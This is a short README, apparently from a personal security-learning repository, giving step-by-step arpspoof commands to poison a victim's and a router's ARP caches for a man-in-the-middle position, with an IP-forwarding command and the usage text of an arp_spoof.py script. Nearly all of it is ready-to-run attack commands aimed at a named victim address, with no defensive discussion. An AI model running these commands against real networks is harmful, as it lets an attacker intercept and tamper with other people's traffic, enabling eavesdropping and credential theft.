# ARP Spoofer

use `arpspoof`

command: `arpspoof -i <interface> -t <target> <gateway>`

example: `arpspoof -i eth0 -t 10.0.2.15 10.0.2.1`

Let's say the victim is `10.0.2.15`, and the router is `10.0.2.1`.

Open two shells:

- Spoof the target, pretend to be the router: `arpspoof -i eth0 -t 10.0.2.15 10.0.2.1`

- Spoof the router, pretend to be the victim target: `arpspoof -i eth0 -t 10.0.2.1 10.0.2.15`

Meantime at the victime machine, type `arp -a` the router's MAC address will become attack machine's MAC address.

Set ip forwarding so victim machine can access the internet: `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'`

---

```sh
usage: arp_spoof.py [-h] [-t TARGET] [-g GATEWAY]

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target ip
  -g GATEWAY, --gateway GATEWAY
                        Gateway ip
```